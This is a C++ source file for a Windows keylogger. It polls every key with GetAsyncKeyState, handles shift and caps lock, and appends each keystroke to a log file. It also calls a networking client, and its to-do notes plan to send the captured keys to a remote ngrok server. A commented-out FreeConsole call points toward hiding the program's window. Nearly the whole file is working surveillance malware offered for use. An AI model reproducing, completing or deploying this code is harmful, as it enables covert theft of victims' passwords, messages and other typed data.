/*
*    ``~ Main file for the keylogger program (Written by haeoro) ~``
*
*    WinMain() initializes all mappings, checks if any key on the keyboard is being pressed.
*    once a key's value has been found and written to a file, key = 0 tells the program that the key has been found
*    and logged, and that it should continue checking other keys to see if they're being pressed. 
*
*    writeKeyStroke() takes an int key argument, then converts that integer to it's corresponding ascii value using 
*    static_cast conversion method, then closes the file.
*/

#include "core/mappings.h"
#include "core/constants.h"
#include "core/find_shift_keys.h"
#include "networking/ks2server.h"

#include <windows.h>
#include <iostream>
#include <fstream>

void writeKeyStroke(int trueKey)
{
    std::ofstream file;
    file.open("logs.txt", std::ios::app);
        
    if (trueKey == ENTER)
    {
        file << "\n";
    }
    else 
    {
        file << static_cast<char>(trueKey);
    }
    file.close();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR lpCmdLine, int nCmdShow)
{
    //FreeConsole();
    // testing client networking function.
    client();
    return 1;
    // end testing.
    Maps vkMaps;
    vkMaps.initializeMaps();
    while (1)
    {
        for (int i = 1; i < 254; i++)
        {
            int key = GetAsyncKeyState(i);
            int dontLogShiftKey = (i != 16 && i != 160 && i != 161);
            while (key == KEY_IS_PRESSED && dontLogShiftKey)
            {
                int specialKey = vkMaps.searchAsciiMaps(i);
                if (isShiftPressed() == 1) 
                {
                    writeKeyStroke(findShiftPlusKey());
                }
                else if (vkMaps.searchMiscMaps(i) != 1) 
                {
                    // null statement as there is no code logic required here.
                    ;
                }
                else if (vkMaps.searchAsciiMaps(i) != 1) 
                {
                    writeKeyStroke(specialKey);
                }
                else 
                {
                    int getCapOrLowKey = isCapslockOn(i);
                    writeKeyStroke(getCapOrLowKey);
                }
                key = 0;
            }
        }
    }
}

/*
    Notes
    

    To-Do list

    in ks2server.cpp:
    ~ ensure all code is written safely and clearly, check for variable names and provide more explanation in documentation for the choice of filename "ks2server.cpp".
    ~ check and see if client() is able to connect to an ngrok server and port.
    ~ provide clear explanations to user for any if statements checking for any WSA errors.
    ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
    ~ figure out why getaddrinfo() is not working in ks2server.cpp 

*/